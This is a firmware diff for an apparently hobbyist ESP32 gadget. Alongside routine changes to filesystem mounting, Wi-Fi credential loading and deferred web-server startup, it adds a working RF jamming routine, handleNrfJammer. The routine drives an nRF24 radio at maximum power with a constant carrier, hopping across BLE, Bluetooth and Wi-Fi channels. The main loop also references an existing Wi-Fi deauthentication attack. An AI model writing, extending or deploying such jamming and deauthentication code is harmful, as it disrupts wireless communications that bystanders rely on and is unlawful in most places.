+  fsReady = LittleFS.begin(false);
+  if (!fsReady) {
+    // Fallback to format only when mount fails.
+    fsReady = LittleFS.begin(true);
+  }
   noteEnsureDir();
+  (void)wifiCredentialsLoadFromFS();
+  wifiAutoConnectPending = (savedWifiSsid.length() > 0);
   (void)utcOffsetLoadFromFS();
   timeApplyTZ();
   (void)brightnessLoadFromFS();
@@ -5853,31 +6351,7 @@ void setup() {
   songStop();
   randomSeed((uint32_t)esp_random());
   waterReset();
-  wifiAutoConfig();
-  timeSynced = false;
-  lastTimeSyncAttemptMs = 0;
-  timeTrySyncNtp();
-  gif.begin(LITTLE_ENDIAN_PIXELS);
-  server.on("/", HTTP_GET, handleRoot);
-  server.on("/api/status", HTTP_GET, handleStatus);
-  server.on("/api/mode", HTTP_GET, handleModeApi);
-  server.on("/api/game", HTTP_GET, handleGameApi);
-  server.on("/api/matrix/getc", HTTP_GET, handleMatrixGetApi);
-  server.on("/api/matrix/setc", HTTP_GET, handleMatrixSetApi);
-  server.on("/api/matrix/template", HTTP_GET, handleMatrixTemplateApi);
-  server.on("/api/matrix/save", HTTP_GET, handleMatrixSaveApi);
-  server.on("/api/matrix/load", HTTP_GET, handleMatrixLoadApi);
-  server.on("/api/brush", HTTP_GET, handleBrushApi);
-  server.on("/api/brightness", HTTP_GET, handleBrightnessApi);
-  server.on("/api/tft/backlight", HTTP_GET, handleBacklightApi);
-  server.on("/api/tft/sleep", HTTP_GET, handleTftSleepApi);
-  server.on("/api/tft/wake", HTTP_GET, handleTftWakeApi);
-  server.on("/api/gyro", HTTP_GET, handleImuApi);
-  server.on("/api/song/play", HTTP_GET, handleSongPlayApi);
-  server.on("/api/song/stop", HTTP_GET, handleSongStopApi);
-  server.on("/api/water", HTTP_GET, handleWaterApi);
-  server.on("/upload", HTTP_POST, handleUploadDone, handleUploadStream);
-  server.begin();
+  deferredInitAtMs = 0;
   uiEnter(UI_MENU);
 }
 
@@ -5907,8 +6381,37 @@ static void matrixTextLoop() {
   }
 }
 
+static void handleNrfJammer() {
+#if HAS_RF24_LIB
+  if (nrfRadioFound) {
+    if (nrfJammingActive && uiScreen == UI_RF_JAMMER && !isSleepActive()) {
+      uint32_t now = millis();
+      if (now - lastNrfJamHopMs >= 10) { 
+        uint8_t channel = 0;
+        if (nrfJamMode == 0) channel = nrfJamBle[random(sizeof(nrfJamBle))];
+        else if (nrfJamMode == 1) channel = nrfJamBt[random(sizeof(nrfJamBt))];
+        else channel = nrfJamWifi[random(sizeof(nrfJamWifi))];
+        nrfRadio.stopConstCarrier(); 
+        nrfRadio.setChannel(channel);
+        nrfRadio.startConstCarrier(RF24_PA_MAX, channel);
+        lastNrfJamHopMs = now;
+      }
+    } else if (nrfJammingActive) {
+      // For when sleep mode triggers
+      nrfJammingActive = false;
+      nrfRadio.stopConstCarrier();
+      nrfRadio.powerDown();
+      nrfRadio.powerUp();
+      uiMarkDirty();
+    }
+  }
+#endif
+}
+
 void loop() {
-  server.handleClient();
+  if (deferredInitDone) server.handleClient();
+  handleNrfJammer();
+  wifiAutoConnectTick();
 
   if (deauthKilling) {
     uint32_t now = millis();
